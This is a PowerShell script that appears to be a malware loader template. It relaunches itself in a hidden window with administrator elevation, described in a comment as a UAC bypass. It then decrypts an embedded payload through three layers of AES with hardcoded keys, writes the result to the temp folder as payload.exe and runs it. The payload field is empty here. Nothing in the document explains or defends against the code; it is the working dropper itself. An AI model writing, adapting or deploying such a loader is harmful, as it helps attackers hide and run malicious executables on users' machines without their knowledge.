
try {{
    $process = Start-Process -FilePath powershell.exe -ArgumentList '-NoProfile -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command \"& {{ ' + $MyInvocation.MyCommand.Definition + ' }}\"' -Verb RunAs"' -Verb RunAs -ErrorAction Stop
    exit
}} catch {{
    # If UAC bypass fails, just continue
}}


$RandomKey = [Convert]::FromBase64String("ui3I1hLCeLM5fbPvrG5lokngJFaCccIACpXNS3oIufw=")
$MasterKey = [Convert]::FromBase64String("raZa+98aplEh0484D1IAmFfTfI458h8HHMOvkQ66hDI=")
$DataB64 = ""

function AES_Decrypt([byte[]]$key, [byte[]]$data) {
    $iv = $data[0..15]
    $cipher = New-Object System.Security.Cryptography.AesManaged
    $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $cipher.Padding = [System.Security.Cryptography.PaddingMode]::None
    $cipher.KeySize = 256
    $cipher.Key = $key
    $decryptor = $cipher.CreateDecryptor($cipher.Key, $iv)
    $encryptedBytes = $data[16..($data.Length-1)]
    $decrypted = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
    return $decrypted
}

$FinalEncBytes = [Convert]::FromBase64String($DataB64)
$DecryptedStep1 = AES_Decrypt $RandomKey $FinalEncBytes
$DecryptedStep2 = [System.Text.Encoding]::ASCII.GetString($DecryptedStep1)
$DecryptedBytes = [Convert]::FromBase64String($DecryptedStep2)
$DecryptedBytes = AES_Decrypt $MasterKey $DecryptedBytes
$DecryptedBytes = AES_Decrypt $RandomKey $DecryptedBytes

# Remove junk padding by trimming trailing zeros
$DecryptedBytes = $DecryptedBytes[0..($DecryptedBytes.Length-1 - (($DecryptedBytes | Where-Object {$_ -eq 0}).Count))]

# Save to temp file and execute
$TempPath = "$env:TEMP\payload.exe"
[IO.File]::WriteAllBytes($TempPath, $DecryptedBytes)
Start-Process $TempPath
